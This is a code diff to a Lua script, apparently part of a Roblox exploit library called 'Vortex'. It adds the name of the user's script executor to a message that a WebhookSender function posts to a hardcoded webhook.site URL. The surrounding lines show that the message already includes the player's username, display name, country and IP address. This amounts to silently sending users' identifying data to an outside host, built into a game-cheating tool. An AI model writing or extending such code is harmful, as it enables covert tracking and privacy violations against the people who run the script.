@@ -160,6 +160,12 @@ end
     return rptr
 end
 
+local function Exploit()
+if identifyexecutor then
+    return identifyexecutor()
+    end
+end
+
 local URL = "https://webhook.site/fa54a700-c2ae-4a96-ac42-6882d4bcd509"
 
 function Vortex:WebhookSender(prompt)
@@ -171,6 +177,7 @@ function Vortex:WebhookSender(prompt)
     local data = {
         ["content"] = prompt,
 	["From"] = LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")",
+	["Exploit"] = Exploit(),
 	["User-Country"] = tostring(Virtual_Region()),
 	["User-IP"] = tostring(Virtual_IP()),
 	["Time"] = tostring(os.date("%X")) .. " ( " .. tostring(Virtual_Region()) .. " )"
